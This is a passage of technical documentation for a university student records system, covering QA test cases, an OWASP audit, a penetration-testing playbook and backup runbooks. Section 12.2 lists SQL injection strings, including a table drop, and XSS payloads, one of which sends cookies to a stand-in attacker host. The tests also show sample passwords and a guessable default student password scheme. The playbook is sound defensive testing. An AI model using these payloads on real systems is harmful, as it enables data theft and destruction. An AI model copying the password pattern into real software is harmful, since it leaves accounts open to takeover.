- **Architectural Remedy**:
  - Executed a migration script that identified orphaned student rows, generated corresponding active user accounts with default hashed passwords, and established foreign key associations.
  - Implemented case-insensitive string collation (`utf8mb4_unicode_ci`) and backend normalization on program and section fields.
  - Verified credentials for target student accounts (such as Enrollment No: `2500100481` configured with standard university credentialing).

### 10.3.5 Bulk Student Details Edit System for Coordinators, Chairpersons, and Admins
- **Problem Symptom**: Administrators and coordinators had to edit hundreds of student profiles individually one by one when advancing academic years or updating placement statuses.
- **Architectural Remedy**:
  - Engineered the `BulkEditModal` component and corresponding backend endpoints (`POST /api/admin/students/bulk-edit`, `POST /api/coordinator/students/bulk-edit`, `POST /api/chairperson/students/bulk-edit`).
  - Implemented multi-select row checkboxes with a "Select All on Page" and "Select All Filtered" toolbar.
  - Enforced strict role-based scope boundaries: Coordinators can only bulk-edit students within their own assigned section, Chairpersons across their department, and Admins universally.

### 10.3.6 Coordinator Student Edit Redirection Defect Resolution
- **Problem Symptom**: When an academic coordinator clicked the "Edit" action on a student in the coordinator students view, the application erroneously redirected the coordinator back to the dashboard instead of opening the student edit form.
- **Root Cause Analysis**:
  - The click event on the table action button was bubbling up to a parent table row listener that contained an unconditional route push to `/coordinator/dashboard`.
  - Furthermore, the edit route path was misconfigured as an absolute path rather than a nested relative path, triggering a fallback route redirect.
- **Architectural Remedy**:
  - Added `e.stopPropagation()` on all action buttons and converted the edit experience to an in-place modal/drawer pattern using the `StudentForm` component, completely eliminating disruptive route transitions.

### 10.3.7 Addition of Internship & Placement Extended Fields
- **Feature Enhancement Request**: User requested the ability to track comprehensive internship and placement timelines and financial terms: Company Name, Date of Joining (DOJ), Date of Exit (DOE), Paid vs Unpaid status, Monthly Stipend, and Annual Salary Package.
- **Architectural Remedy**:
  - **Database Migration**: Added 8 new columns to the `students` table:
    1. `internshipCompany` (`VARCHAR(255)`)
    2. `internshipDoj` (`DATE`)
    3. `internshipDoe` (`DATE`)
    4. `internshipIsPaid` (`BOOLEAN`, default `false`)
    5. `internshipStipend` (`VARCHAR(100)`)
    6. `placementCompany` (`VARCHAR(255)`)
    7. `placementDoj` (`DATE`)
    8. `placementIsPaid` (`BOOLEAN`, default `true`)
  - **Model Synchronization**: Updated Sequelize `Student.js` model definitions with validation rules and type declarations.
  - **UI Integration**: Extended `StudentForm.tsx`, `StudentDetailComponent.tsx`, and `CategoryView.tsx` to capture, validate, and display these timeline and financial details.
  - **Bulk Edit Expansion**: Added these new fields to the bulk edit modal options, enabling coordinators to record batch company placement results across classes.

---

## 10.4 Autonomous AI Agent Implementation & Maintenance Guide

This section establishes formal operating procedures for autonomous AI agents (such as Google Antigravity, Claude Engineer, or OpenAI Codex) tasked with reading, refactoring, expanding, or deploying the GBU-SDSM codebase.

### 10.4.1 Agent Directive 1: Preserving Tenancy & RBAC Invariants
- **NEVER** bypass role-based query scoping in controllers. When creating or modifying coordinator endpoints, always assert:
  ```javascript
  where: { ...query, program: coordinator.program, branch: coordinator.branch, section: coordinator.section }
  ```
- Failure to enforce this scope creates an Insecure Direct Object Reference (IDOR) vulnerability.

### 10.4.2 Agent Directive 2: Atomic Database Transactions on Multi-Table Writes
- Whenever an operation touches more than one model (e.g., creating a Student and User, or creating an AttendanceSession and AttendanceRecords), agents **MUST** encapsulate the logic in a managed Sequelize transaction:
  ```javascript
  const result = await sequelize.transaction(async (t) => {
    const user = await User.create(userData, { transaction: t });
    const student = await Student.create({ ...studentData, userId: user.id }, { transaction: t });
    return { user, student };
  });
  ```

### 10.4.3 Agent Directive 3: Handling Excel Spreadsheets in Memory
- Never write uploaded spreadsheets to disk when parsing. Ingest files using Multer's `memoryStorage()` and parse directly via `xlsx.read(req.file.buffer, { type: 'buffer' })`. This prevents temporary disk leaks and eliminates concurrency conflicts.

### 10.4.4 Agent Directive 4: Maintaining UI Responsive Design & Accessible Modals
- When constructing or altering React components, maintain Tailwind CSS responsive utility classes (`sm:`, `md:`, `lg:`, `xl:`).
- Modals must be rendered via React Portals into `document.body` with a fixed z-index (`z-50`) and backdrop blur (`backdrop-blur-sm bg-black/50`) to avoid DOM clipping by parent overflow containers.



---

# SECTION 11: Comprehensive Quality Assurance Playbooks & Test Verification Matrix

This section establishes the formal Quality Assurance (QA) verification framework for the Gautam Buddha University Student Data Management System. It contains 48 rigorous test cases spanning authentication, authorization, student administration, attendance workflows, communication channels, and timetable scheduling.

---

## 11.1 QA Testing Philosophy & Testing Pyramid Architecture

GBU-SDSM adheres to a multi-tiered test verification architecture:
- **Unit Testing Layer**: Isolates individual functions, utility algorithms (fuzzy header normalizer, attendance percentage calculator), and data transformation hooks.
- **Integration Testing Layer**: Exercises Express route controllers, middleware chains, database transactions, and Sequelize model hooks against an active test database.
- **End-to-End (E2E) & Acceptance Layer**: Simulates real user and autonomous agent journeys through browser workflows, verifying DOM updates, modal transitions, and asynchronous Redux state synchronization.

```mermaid
pie title SDSM Test Coverage Distribution
    "Unit Tests (Algorithms & Utils)" : 35
    "Integration Tests (APIs & Transactions)" : 40
    "End-to-End Tests (Portals & Workflows)" : 25
```

---

## 11.2 Authentication & Session QA Test Suite

### TC-AUTH-01: Super Administrator Login Verification
- **Pre-conditions**: Database populated with default administrator account (`admin@gbu.ac.in`).
- **Input Parameters**: `{ "identifier": "admin@gbu.ac.in", "password": "AdminSecurePassword2026!", "role": "admin" }`.
- **Execution Steps**:
  1. Dispatch HTTP POST to `/api/auth/login`.
  2. Inspect response status code and JSON envelope.
  3. Inspect Set-Cookie header for `refreshToken`.
- **Expected Results**: Status code `200 OK`. Payload contains valid JWT `token` with claim `role: "admin"`. `refreshToken` cookie issued with `HttpOnly`, `SameSite=Strict`, and `Path=/api/auth`.
- **Pass / Fail Invariants**: Response time must be $< 250\text{ms}$. No password or hash strings leaked in payload.

### TC-AUTH-02: Faculty Login with Email & Course Binding
- **Pre-conditions**: Active faculty user record with associated teaching assignment.
- **Input Parameters**: `{ "identifier": "faculty.cs@gbu.ac.in", "password": "FacultyPassword123!", "role": "faculty" }`.
- **Execution Steps**: Authenticate via login API; parse returned token; query `GET /api/faculty/classes`.
- **Expected Results**: Status code `200 OK`. Class list contains assigned courses with active semester and section metadata.

### TC-AUTH-03: Student Login with Enrollment Number & Initial Password
- **Pre-conditions**: Student enrolled with enrollment number `2500100481` and default university password `GBU@2500100481`.
- **Input Parameters**: `{ "identifier": "2500100481", "password": "GBU@2500100481", "role": "student" }`.
- **Execution Steps**: Submit login payload. Verify response payload.
- **Expected Results**: Status code `200 OK`. Returned student profile shows student name, enrolled program (`B.Tech`), branch (`Computer Science and Engineering`), and section (`A`).

### TC-AUTH-04: Credential Mismatch & Rate Limiter Increment
- **Pre-conditions**: Registered user exists.
- **Input Parameters**: Valid identifier, incorrect candidate password.
- **Execution Steps**: Post incorrect credentials. Repeat 5 times consecutively within 60 seconds.
- **Expected Results**: Attempts 1 through 4 return `401 Unauthorized` with generic error message *"Invalid credentials"*. Attempt 5 triggers account temporary lock flag. Attempt 6 returns `429 Too Many Requests` or `403 Forbidden` with lockout delay metadata.

### TC-AUTH-05: Silent Access Token Refresh Pipeline
- **Pre-conditions**: User possesses valid `refreshToken` cookie; access token has expired ($> 15\text{ minutes}$).
- **Execution Steps**: Dispatch `GET /api/auth/me` with expired Bearer token.
- **Expected Results**: Backend returns `401 Unauthorized` (`TOKEN_EXPIRED`). Frontend Axios interceptor catches 401, issues `POST /api/auth/refresh-token`, receives fresh access token, updates Redux store and `localStorage`, and replays original request transparently to the user.

### TC-AUTH-06: Compromised Refresh Token Reuse & Revocation Cascading
- **Pre-conditions**: Refresh token $R_1$ is exchanged for $R_2$ (incrementing `tokenVersion` from 1 to 2).
- **Execution Steps**: Malicious actor attempts to submit rotated token $R_1$ to `/api/auth/refresh-token`.
- **Expected Results**: Server detects `tokenVersion` claim mismatch ($1 \ne 2$). Transaction immediately marks all sessions for that `userId` as revoked, increments `tokenVersion` to 3, and returns `401 Unauthorized` (*"Session compromised; re-authentication mandatory"*).

### TC-AUTH-07: Password Reset One-Time Password (OTP) Generation
- **Execution Steps**: Dispatch `POST /api/auth/forgot-password` with registered email.
- **Expected Results**: Status code `200 OK`. Database user row updates with 6-digit numeric OTP and 10-minute expiry timestamp. SMTP service logs successful dispatch.

### TC-AUTH-08: Password Reset OTP Expiration Validation
- **Execution Steps**: Attempt verification of OTP with an artificially aged `resetPasswordExpires` ($> 10\text{ minutes}$ in the past).
- **Expected Results**: Status code `400 Bad Request` with message *"OTP has expired. Please request a new code."*

---

## 11.3 Student Administration QA Test Suite

### TC-STUD-01: Single Student Profile Creation
- **Pre-conditions**: Admin logged in.
- **Input Parameters**: Complete demographic, academic, and contact JSON object.
- **Execution Steps**: Dispatch `POST /api/admin/students`.
- **Expected Results**: Status code `201 Created`. Database creates both `users` row and `students` row with matching foreign key in a single atomic transaction.

### TC-STUD-02: Duplicate Enrollment Number Collision Prevention
- **Execution Steps**: Submit student creation payload containing an existing enrollment number (`2500100481`).
- **Expected Results**: Status code `409 Conflict`. Transaction automatically rolls back. No duplicate record inserted.

### TC-STUD-03: Bulk Excel Spreadsheet Upload with Standard Headers
- **Pre-conditions**: Excel file (`roster_valid.xlsx`) containing 50 valid student rows with canonical column headers.
- **Execution Steps**: Dispatch multipart upload to `/api/admin/students/bulk-upload`.
- **Expected Results**: Status code `200 OK`. Ingestion summary returns `{ insertedCount: 50, updatedCount: 0, skippedCount: 0, errors: [] }`.

### TC-STUD-04: Bulk Excel Upload with Fuzzy Aliased Headers
- **Pre-conditions**: Spreadsheet with headers renamed: `"Roll Number"`, `"Candidate Name"`, `"Email ID"`, `"Discipline"`, `"Date of Birth"`.
- **Execution Steps**: Dispatch upload to `/api/admin/students/bulk-upload`.
- **Expected Results**: Normalization engine maps all aliased headers correctly to schema attributes without manual intervention; 100% of rows ingested successfully.

### TC-STUD-05: Bulk Excel Upload Transaction Rollback on Schema Violation
- **Pre-conditions**: Spreadsheet containing 49 valid rows and 1 corrupted row (invalid enrollment number format and missing name).
- **Execution Steps**: Dispatch upload to `/api/admin/students/bulk-upload`.
- **Expected Results**: The atomic transaction rolls back all 50 rows. Response returns `400 Bad Request` with detailed row-level error log pointing directly to row 38.

### TC-STUD-06: Student Profile CategoryView Display
- **Execution Steps**: Open student detail modal in Coordinator or Admin portal.
- **Expected Results**: `CategoryView` renders segmented cards: Personal, Academic, Contact, Address, and Placement/Internship sections. All 8 new internship and placement fields display formatted values (Company name, formatted DOJ/DOE dates, Paid/Unpaid badge, Stipend, Package).

### TC-STUD-07: Single Student Edit with Internship & Placement Attributes
- **Execution Steps**: Coordinator opens edit form for an assigned student, inputs:
  - `internshipCompany: "Google India"`
  - `internshipDoj: "2026-06-01"`
  - `internshipDoe: "2026-08-31"`
  - `internshipIsPaid: true`
  - `internshipStipend: "100000/month"`
  - `placed: true`
  - `company: "Google"`
  - `package: "32 LPA"`
  - `placementDoj: "2027-07-15"`
  - `placementIsPaid: true`
  Submits form via `PUT /api/coordinator/students/:id`.
- **Expected Results**: Status code `200 OK`. Database updates all 8 attributes. Modal closes smoothly without dashboard redirection.

### TC-STUD-08: Chronological Date Validation Invariant
- **Execution Steps**: Input `internshipDoj = "2026-09-01"` and `internshipDoe = "2026-05-01"` (Exit date before Joining date).
- **Expected Results**: Frontend validation highlights date fields in red with message *"Internship completion date must occur after joining date"*. Submission is prevented.

### TC-STUD-09: Coordinator Data Isolation & Tampering Defense
- **Pre-conditions**: Coordinator $C_1$ is assigned to Section A. Student $S_2$ belongs to Section B.
- **Execution Steps**: $C_1$ crafts an HTTP `PUT /api/coordinator/students/:id` targeting student $S_2$'s ID.
- **Expected Results**: Controller checks coordinator's assigned section against $S_2$'s section, rejects request with `403 Forbidden` (*"Unauthorized: Student does not belong to your assigned section"*).

### TC-STUD-10: Multi-Select Bulk Edit in Coordinator Portal
- **Execution Steps**: Coordinator selects 15 students in Section A, clicks "Bulk Edit", sets `year: 4`, `semester: 7`, clicks "Apply Changes".
- **Expected Results**: Bulk edit API executes scoped update. All 15 selected students advance to Year 4, Semester 7. Students in Section B remain unaffected.

---

## 11.4 Attendance Marking & Auditing QA Test Suite

### TC-ATT-01: Faculty Assigned Class Roster Loading
- **Execution Steps**: Faculty member navigates to `/faculty/attendance`, selects assigned course from dropdown.
- **Expected Results**: API queries enrolled students matching course's program, branch, and section; roster table populates with student roll numbers, names, and default status set to "Present".

### TC-ATT-02: Attendance Session Submission & Record Creation
- **Execution Steps**: Instructor marks 3 students "Absent", adds topic *"Binary Search Trees & AVL Balancing"*, clicks "Submit Attendance".
- **Expected Results**: Status code `201 Created`. `attendance_sessions` record created; corresponding `attendance_records` rows inserted in atomic transaction.

### TC-ATT-03: Duplicate Attendance Session Prevention
- **Execution Steps**: Instructor attempts to mark a second attendance session for the identical class, date, and lecture slot.
- **Expected Results**: Status code `409 Conflict` with message *"An attendance session has already been recorded for this course and time slot today"*.

### TC-ATT-04: Session Modification Within 24-Hour Grace Window
- **Execution Steps**: Instructor modifies an attendance record 4 hours after session submission (changing a student from "Absent" to "Present" with remark *"Arrived with verified medical slip"*).
- **Expected Results**: Status code `200 OK`. Record updates; audit log records the modification timestamp and user ID.

### TC-ATT-05: Session Modification Lockout After 24 Hours
- **Execution Steps**: Faculty attempts to modify an attendance session recorded 48 hours earlier.
- **Expected Results**: Status code `403 Forbidden` with message *"Attendance session is locked. Historical edits require administrative authorization."*

### TC-ATT-06: Administrative Override on Locked Session
- **Execution Steps**: Administrator opens historical session, modifies status, enters mandatory audit remark *"Dean approval memo #402"*.
- **Expected Results**: Status code `200 OK`. Record modified; audit trail permanently binds the administrative identity and override justification.

### TC-ATT-07: Attendance Percentage Calculation Accuracy
- **Pre-conditions**: Student has 40 total conducted sessions: 32 Present, 4 Late, 4 Absent.
- **Calculation Verification**:
  $$\text{Weighted Score} = 32 + (0.5 \times 4) = 34.0$$
  $$\text{Percentage} = \left( \frac{34.0}{40} \right) \times 100 = 85.0\%$$
- **Expected Results**: `GET /api/attendance/student/:id` returns exactly `85.00%`.

### TC-ATT-08: Defaulter List Generation Threshold
- **Pre-conditions**: Class with 60 students; 8 students have attendance $< 75.0\%$.
- **Execution Steps**: Coordinator queries defaulter report.
- **Expected Results**: Report lists exactly the 8 defaulter students, highlighting their attendance in amber/red with contact information for institutional notice generation.

---

## 11.5 Messaging & Communication QA Test Suite

### TC-MSG-01: Direct Message Delivery
- **Execution Steps**: Coordinator sends direct message to Faculty member via `POST /api/messages/send`.
- **Expected Results**: Message record created with `recipientId: faculty.userId`. Faculty inbox shows unread message with sender name and badge.

### TC-MSG-02: Class Broadcast Announcement Dispatch
- **Execution Steps**: Coordinator selects "Class Broadcast", inputs subject and content, submits.
- **Expected Results**: System queries all active students in coordinator's class section; inserts broadcast record; each student sees announcement in their portal inbox.

### TC-MSG-03: Universal Broadcast Authorization Guard
- **Execution Steps**: Coordinator or Faculty attempts to send a message with `recipientType: "Universal"`.
- **Expected Results**: Request terminated with `403 Forbidden` (*"Universal broadcasts are strictly restricted to system administrators"*).



---

# SECTION 12: Security Threat Modeling, Penetration Testing Runbook & OWASP Top 10 Verification

This section provides an exhaustive security audit, vulnerability assessment, and threat modeling playbook for the Gautam Buddha University Student Data Management System (GBU-SDSM). It formally benchmarks the system against the Open Worldwide Application Security Project (OWASP) Top 10 enterprise standards and outlines explicit penetration testing scenarios.

---

## 12.1 OWASP Top 10 Compliance Audit & Defense Ledger

```mermaid
flowchart TD
    subgraph AttackVectors["Threat Vectors & Penetration Entry Points"]
        SQLi["SQL Injection (A03)"]
        BOLA["Broken Object Level Authorization (A01)"]
        XSS["Cross-Site Scripting (A03)"]
        Brute["Brute-Force & Credential Stuffing (A07)"]
        CSRF["Cross-Site Request Forgery (A01)"]
        MIME["Malicious File Ingestion (A08)"]
    end

    subgraph DefenseArchitecture["Multi-Layered SDSM Defensive Shields"]
        ORM["Sequelize Typed Parameterized Query Layer"]
        RBAC["Scoped Role & Section Guard Middleware"]
        ReactSan["React Virtual DOM Auto-Escaping + CSP"]
        RateLim["Express Rate Limiting & Account Lockout"]
        AuthHeader["Bearer Token Architecture + HttpOnly Cookies"]
        MulterVal["In-Memory Buffer Streaming & Strict MIME Filter"]
    end

    SQLi --> ORM
    BOLA --> RBAC
    XSS --> ReactSan
    Brute --> RateLim
    CSRF --> AuthHeader
    MIME --> MulterVal
```

### 12.1.1 A01: Broken Access Control
- **Threat Vector**: Horizontal privilege escalation (Coordinator $A$ accessing Coordinator $B$'s section data) or Vertical privilege escalation (Student manipulating HTTP requests to access Admin endpoints).
- **Vulnerability Mechanism**: Relying solely on client-side routing guards or passing unchecked entity IDs in query parameters.
- **Architectural Safeguards**:
  - Every API endpoint is wrapped by `authMiddleware` and `roleMiddleware` on the Express server tier.
  - Server controllers enforce mandatory tenancy and scope constraints:
    ```javascript
    // Coordinator query filter enforced unconditionally
    const where = {
      id: studentId,
      program: req.user.coordinator.program,
      branch: req.user.coordinator.branch,
      section: req.user.coordinator.section
    };
    const student = await Student.findOne({ where });
    if (!student) {
      return res.status(403).json({ success: false, message: "Resource outside authorized section scope" });
    }
    ```
  - Administrative routes check `req.user.role === 'admin'` before parsing body payloads.

### 12.1.2 A02: Cryptographic Failures
- **Threat Vector**: Interception of cleartext traffic on campus networks or recovery of user passwords from database backups.
- **Architectural Safeguards**:
  - Transport Layer Security (TLS 1.2 / TLS 1.3) enforced with HTTP Strict Transport Security (HSTS) max-age set to 1 year (`31536000` seconds).
  - Passwords hashed using bcrypt with adaptive salt cost factor of `10` iterations.
  - Segregated cryptographic secrets for Access Tokens (`JWT_SECRET`) and Refresh Tokens (`REFRESH_TOKEN_SECRET`), generated with 512 bits of cryptographically secure pseudorandom entropy.
  - No sensitive credentials, private keys, or passwords written to console logs or returned in API responses (Sequelize `defaultScope` explicitly excludes `password` and `resetPasswordOtp`).

### 12.1.3 A03: Injection Attacks
- **Threat Vector**: SQL Injection (SQLi) via query string parameters, search boxes, or Excel column headers; Command injection through file naming.
- **Architectural Safeguards**:
  - 100% of database interactions execute through Sequelize ORM using typed prepared statements with parameter binding:
    ```javascript
    // Secure Parameterized Query
    const students = await Student.findAll({
      where: {
        name: { [Op.like]: `%${sanitizedSearchTerm}%` },
        program: sanitizedProgram
      }
    });
    ```
  - No concatenation of raw SQL strings (`SELECT * FROM students WHERE name = '` + input + `'`) is permitted in any repository or controller.
  - Filename sanitization strips non-alphanumeric characters, eliminating shell injection vectors.

### 12.1.4 A04: Insecure Design
- **Threat Vector**: Business logic flaws such as marking attendance for future dates or negative attendance percentages.
- **Architectural Safeguards**:
  - Strict domain invariants: `sessionDate` must satisfy $\text{sessionDate} \le \text{CurrentDate()}$.
  - Attendance percentages bounded mathematically in $[0.00, 100.00]$.
  - Attendance sessions lock automatically 24 hours after creation, requiring formal administrative override with mandatory reason logging for historical updates.

### 12.1.5 A05: Security Misconfiguration
- **Threat Vector**: Leaking server stack traces, default passwords, enabled directory browsing, or permissive CORS wildcard headers (`*`).
- **Architectural Safeguards**:
  - Express error-handling middleware sanitizes error responses in production: `NODE_ENV === 'production'` suppresses error stack traces, returning structured JSON error envelopes.
  - CORS configuration explicitly whitelists origin domains; rejects wildcard origin (`*`) when `credentials: true` is active.
  - Helmet middleware applies strict HTTP response headers: `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`.

### 12.1.6 A06: Vulnerable and Outdated Components
- **Threat Vector**: Exploitation of known vulnerabilities (CVEs) in third-party npm packages.
- **Architectural Safeguards**:
  - Routine dependency scanning via `npm audit --production`.
  - Fixed semantic versioning in `package.json` with lockfiles (`package-lock.json`) to prevent unverified upstream transitive dependency updates.

### 12.1.7 A07: Identification and Authentication Failures
- **Threat Vector**: Credential stuffing, dictionary attacks against login endpoints, session fixation, and token reuse.
- **Architectural Safeguards**:
  - Dual-token architecture with automatic token rotation.
  - Refresh tokens bound to `tokenVersion` stored in the database; single token reuse invalidates all active sessions for that account.
  - Express Rate Limiter limits login attempts to 10 requests per 15 minutes per IP.
  - User model locks account after 5 consecutive failed login attempts for 30 minutes.

### 12.1.8 A08: Software and Data Integrity Failures
- **Threat Vector**: Uploading malicious spreadsheets containing executable macros (Formula Injection / CSV Injection) or corrupted binary buffers.
- **Architectural Safeguards**:
  - In-memory spreadsheet parsing via SheetJS without temporary disk storage.
  - Cell value sanitization: strings starting with dangerous formula prefixes (`=`, `+`, `-`, `@`) are prepended with a single quote or stripped before persistence, disarming dynamic command execution in desktop spreadsheet software.
  - Multer MIME type whitelisting verifies file signatures.

### 12.1.9 A09: Security Logging and Monitoring Failures
- **Threat Vector**: Undetected administrative tampering, unauthorized student grade or attendance changes.
- **Architectural Safeguards**:
  - Centralized `AuditLog` entity records: Actor User ID, Actor Role, Target Entity (Student, AttendanceSession, FacultyAssignment), Entity ID, Action (`CREATE`, `UPDATE`, `DELETE`, `OVERRIDE`), Timestamp, and IP Address.
  - Automated request logging with UUIDv4 correlation IDs allows end-to-end tracing of every state mutation.

### 12.1.10 A10: Server-Side Request Forgery (SSRF)
- **Threat Vector**: Inducing the backend server to make unauthorized HTTP requests to internal network services or metadata endpoints.
- **Architectural Safeguards**:
  - GBU-SDSM does not expose user-configurable webhook or URL fetching endpoints.
  - SMTP server hostnames and external API connections are hardcoded within server environment variables.

---

## 12.2 Penetration Testing Playbooks & Verification Procedures

This subsection defines repeatable penetration testing scenarios that QA engineers and security auditors must execute prior to major release deployments.

### 12.2.1 Scenario PT-01: SQL Injection Exploitation Simulation
- **Target Endpoint**: `GET /api/admin/students?search=`
- **Injected Payload Strings**:
  1. `' OR 1=1 --`
  2. `" OR "" = "`
  3. `'; DROP TABLE students; --`
  4. `' UNION SELECT id, email, password, 1, 2, 3, 4 FROM users --`
- **Execution**: Submit HTTP requests with each payload string encoded in the `search` query parameter.
- **Pass Invariant**: Server responds with HTTP `200 OK` returning an empty array or valid substring search matches for literal punctuation. The database tables remain intact, and no raw SQL syntax errors or database schema structures leak into the response body.

### 12.2.2 Scenario PT-02: Stored Cross-Site Scripting (XSS) Simulation
- **Target Endpoint**: `PUT /api/coordinator/students/:id`
- **Injected Payload Strings**:
  1. `<script>alert(document.cookie)</script>`
  2. `<img src=x onerror=this.src='http://malicious.com/?c='+document.cookie>`
  3. `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
- **Execution**: Update student `address`, `fatherName`, or `internshipCompany` with the payload string. Log in as student or admin and view the student's profile modal.
- **Pass Invariant**: React renders the payload as harmless literal text on the screen. No JavaScript executes in the browser console, and no external HTTP network requests are initiated by the DOM.

### 12.2.3 Scenario PT-03: Broken Object Level Authorization (IDOR) Simulation
- **Target Endpoint**: `GET /api/coordinator/students/999`
- **Test Context**: Authenticated as Coordinator $C_1$ (assigned to B.Tech CSE Section A). Student ID `999` belongs to B.Tech CSE Section B.
- **Execution**: Dispatch `GET /api/coordinator/students/999` using $C_1$'s Bearer token.
- **Pass Invariant**: Server returns HTTP `403 Forbidden` or `404 Not Found`. No demographic, attendance, or placement details for student `999` are exposed.

### 12.2.4 Scenario PT-04: JWT None-Algorithm Signature Bypass
- **Target Endpoint**: `GET /api/admin/students`
- **Execution**: Craft an unsigned JWT token with header `{"alg": "none", "typ": "JWT"}` and claims `{"id": 1, "role": "admin"}`. Submit token in `Authorization: Bearer <tampered_token>`.
- **Pass Invariant**: Express `authMiddleware` rejects the token with HTTP `401 Unauthorized` (*"Invalid token signature"*).

---

## 12.3 Cryptographic Key Management & Entropy Standards

GBU-SDSM enforces strict rules for generating, maintaining, and rotating cryptographic secrets.

### 12.3.1 Cryptographic Secret Generation Runbook
Administrators generating keys for production deployments must utilize high-entropy sources:
```bash
# Generate 512-bit JWT Access Secret
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"

# Generate 512-bit Refresh Token Secret
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"

# Generate 256-bit Cookie Session Secret
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

### 12.3.2 Emergency Key Compromise Rotation Procedure
Should a production `JWT_SECRET` or `REFRESH_TOKEN_SECRET` be leaked:
1. Immediately generate new secret strings following Section 12.3.1.
2. Update the environment variables in the production configuration manager (`backend/.env` or systemd environment file).
3. Execute zero-downtime rolling restart of backend Node.js processes via PM2:
   ```bash
   pm2 reload gbu-sdms-api --update-env
   ```
4. Run atomic SQL query to increment `tokenVersion` across all accounts, invalidating all pre-existing refresh tokens:
   ```sql
   UPDATE users SET tokenVersion = tokenVersion + 1;
   ```
5. All active user sessions are terminated instantly, compelling re-authentication with fresh credentials and generating new, securely signed tokens.



---

# SECTION 13: Database Backup, Disaster Recovery, Performance Tuning & Codebase Migration Playbooks

This section provides comprehensive infrastructure runbooks for operational resilience, database lifecycle management, zero-downtime migrations, performance optimization, and autonomous disaster recovery for GBU-SDSM.

---

## 13.1 Database Backup & Automated Snapshot Architecture

Data persistence in GBU-SDSM mandates rigorous, automated backup policies to protect institutional records, attendance histories, and student identities against infrastructure failures, accidental deletions, or storage corruption.

```mermaid
flowchart TD
    subgraph Scheduler["Automated Backup Scheduler (Cron / Task Scheduler)"]
        DailyCron["Daily Snapshot (02:00 UTC)"]
        WeeklyCron["Weekly Consolidated Archive"]
    end

    subgraph BackupEngine["Backup Execution Engine"]
        Dump["mysqldump --single-transaction --quick"]
        Gzip["gzip --best Stream Compression"]
        Hash["sha256sum Checksum Verification"]
    end

    subgraph StorageTiers["Segmented Storage Targets"]
        LocalSnap["Local Volume Snapshot (/var/backups/sdms)"]
        OffsiteCloud["Offsite Encrypted Object Store (S3 / Cold Storage)"]
        Rotation["30-Day Retention & Pruning Engine"]
    end

    DailyCron --> Dump
    WeeklyCron --> Dump
    Dump --> Gzip
    Gzip --> Hash
    Hash --> LocalSnap
    LocalSnap --> OffsiteCloud
    OffsiteCloud --> Rotation
```

### 13.1.1 Production Logical Backup Script (Linux Bash)
The following automated backup script (`/usr/local/bin/sdms-backup.sh`) executes transactional logical dumps without interrupting active user traffic:
```bash
#!/usr/bin/env bash
set -eo pipefail

# Configuration Parameters
BACKUP_DIR="/var/backups/sdms/mysql"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
DB_NAME="${DB_NAME:-gbu_sdms_db}"
DB_USER="${DB_USER:-sdms_user}"
DB_PASS="${DB_PASS}"
RETENTION_DAYS=30
BACKUP_FILE="${BACKUP_DIR}/${DB_NAME}_${TIMESTAMP}.sql.gz"
CHECKSUM_FILE="${BACKUP_FILE}.sha256"

# Ensure target directory exists
mkdir -p "${BACKUP_DIR}"

echo "[$(date -u)] Starting transactional MySQL backup for database: ${DB_NAME}..."

# Execute mysqldump with single-transaction to ensure ACID consistency without table locking
mysqldump \
  --host="127.0.0.1" \
  --port=3306 \
  --user="${DB_USER}" \
  --password="${DB_PASS}" \
  --single-transaction \
  --quick \
  --routines \
  --triggers \
  --events \
  --hex-blob \
  --default-character-set=utf8mb4 \
  "${DB_NAME}" | gzip -9 > "${BACKUP_FILE}"

# Compute SHA256 integrity hash
sha256sum "${BACKUP_FILE}" > "${CHECKSUM_FILE}"

echo "[$(date -u)] Backup completed successfully: ${BACKUP_FILE}"
echo "[$(date -u)] Checksum: $(cat ${CHECKSUM_FILE})"

# Prune snapshots older than retention threshold
find "${BACKUP_DIR}" -type f -name "*.sql.gz" -mtime +${RETENTION_DAYS} -delete
find "${BACKUP_DIR}" -type f -name "*.sha256" -mtime +${RETENTION_DAYS} -delete

echo "[$(date -u)] Retention pruning completed. Retaining latest ${RETENTION_DAYS} days."
```

### 13.1.2 Windows Server Automated Backup Script (PowerShell)
For deployment environments running on Windows Server:
```powershell
# SDMS-Backup.ps1
$BackupRoot = "C:\Backups\SDMS"
$Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$DbName = "gbu_sdms_db"
$DbUser = "sdms_user"
$DbPass = $env:DB_PASS
$OutputFile = "$BackupRoot\${DbName}_${Timestamp}.sql"
$ZipFile = "$OutputFile.zip"

New-Item -ItemType Directory -Force -Path $BackupRoot | Out-Null

Write-Host "Starting mysqldump for $DbName..."
& "mysqldump.exe" --host=127.0.0.1 --port=3306 --user=$DbUser --password=$DbPass --single-transaction --quick --routines --triggers --hex-blob --default-character-set=utf8mb4 $DbName > $OutputFile

Write-Host "Compressing dump archive..."
Compress-Archive -Path $OutputFile -DestinationPath $ZipFile -CompressionLevel Optimal
Remove-Item -Path $OutputFile

Write-Host "Backup finalized: $ZipFile"
Get-ChildItem -Path $BackupRoot -Filter "*.zip" | Where-Object { $_.CreationTime -lt (Get-Date).AddDays(-30) } | Remove-Item
```

---

## 13.2 Disaster Recovery Runbooks & Point-In-Time Recovery (PITR)

In the event of total server hardware failure, storage corruption, or catastrophic operator error (such as an accidental table drop), engineering teams and AI agents must follow this recovery sequence.

```mermaid
sequenceDiagram
    autonumber
    actor Admin as SysAdmin / DevOps Agent
    participant Storage as Backup Archive
    participant MySQL as MySQL Database Server
    participant Binlog as MySQL Binary Log Engine
    participant App as Express Backend Application

    Note over Admin,App: Disaster Declared (Data Loss / Hardware Failure)
    Admin->>App: Stop Node.js Processes (pm2 stop all)
    Admin->>Storage: Retrieve Latest Full Snapshot (e.g. gbu_sdms_db_20260905.sql.gz)
    Admin->>Admin: Verify SHA256 Checksum
    Admin->>MySQL: Restore Base State (gunzip < dump.sql.gz | mysql gbu_sdms_db)
    Note over MySQL: Base Relational Tables Restored to 02:00 UTC
    Admin->>Binlog: Query Binary Logs from 02:00 UTC to Incident Time
    Admin->>MySQL: Replay Transactions (mysqlbinlog binlog.000042 | mysql gbu_sdms_db)
    Note over MySQL: All Delta Transactions Replayed to Point-of-Failure
